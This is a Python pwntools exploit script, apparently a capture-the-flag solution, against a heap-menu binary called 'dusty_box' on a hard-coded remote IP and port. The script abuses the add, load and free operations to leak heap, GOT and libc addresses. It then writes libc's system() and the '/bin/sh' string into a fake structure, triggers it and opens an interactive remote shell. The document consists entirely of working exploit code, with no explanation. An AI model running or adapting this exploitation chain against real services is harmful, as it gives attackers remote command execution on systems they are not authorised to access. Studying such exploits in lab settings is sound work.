from pwn import *

context.arch = 'amd64'
libc = ELF('./libc.so.6')

def add(idx, content):
	r.sendlineafter('>>', '1')
	r.sendlineafter(':', str(idx))
	r.sendafter(':', content)
	r.recvuntil('Cookie : ')
	return int(r.recvline().strip(), 16)

def load(idx, cookie):
	r.sendlineafter('>>', '2')
	r.sendlineafter('Id : ', str(idx))
	r.sendlineafter('Cookie : ', str(cookie))

def free(idx, cookie):
	r.sendlineafter('>>', '3')
	r.sendlineafter(':', str(idx))
	r.sendlineafter(':', str(cookie))

def act():
	r.sendlineafter('>>', '4')

long_max = 2**32
#r = process('./dusty_box')
r = remote('35.226.111.216', 2222)

c = [[] for _ in range(5)]
for i in range(4):
	c[0].append(add(0, flat(0, 0x98)))

free(0, c[0][3])
load(0, c[0][0])
load(long_max-3, c[0][0])
free(0, c[0][1])
load(0, c[0][2])

r.recvuntil('Content : ')
heap = u64(r.recvn(6)+'\x00'*2)
print "heap @ ", hex(heap)
target = heap-0xc0
print "target @ ", hex(target)

c[1].append(add(1, flat(target, target-0x30, 0, target)))
c[0][0] = c[0][1] = target
load(0, c[0][0])
r.recvuntil('Content : ')
got_base = u64(r.recv(24)[-8:]) + 0x3000 - 0x430 - 0xb4
print "got_base @ ", hex(got_base)
free_got = got_base

free(0, c[0][0])
c[1][0] = add(2, flat(c[0][0], free_got, 0, c[0][0]))
c[2].append(c[1][0])
load(0, c[0][0])
libc_base = u64(r.recvuntil('\x7f')[-6:]+'\x00'*2) - libc.symbols['free']
print "libc_base @ ", hex(libc_base)
system = libc_base + libc.symbols['system']
print "system @ ", hex(system)
sh = libc_base + next(libc.search('/bin/sh'))
print "sh @ ", hex(sh)

free(1, c[1][0])
c[3].append(add(3, flat(0xfaceb00c, sh, system, 0)))
load(2, 0xfaceb00c)
act()

r.interactive()